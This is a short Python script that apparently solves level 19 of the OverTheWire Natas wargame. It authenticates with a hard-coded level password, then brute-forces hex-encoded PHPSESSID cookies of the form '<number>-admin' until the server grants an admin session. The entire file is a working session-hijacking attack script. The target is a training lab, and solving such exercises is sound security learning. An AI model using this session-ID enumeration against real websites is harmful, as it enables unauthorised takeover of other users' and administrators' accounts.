#!/usr/bin/python

import requests

username = 'natas19'
password = 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr'
url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()
session.auth = (username, password)

for attempt in range (1, 640):
    session_id = f"{attempt}-admin"
    encoded_id = session_id.encode('utf-8').hex()
    session.cookies.set('PHPSESSID' , encoded_id)
    response = session.get(url)
    print(f"trying {attempt}")
    if "You are an admin" in response.text:
        print(f"admin session is: {attempt}")
        print(response.text)
        break


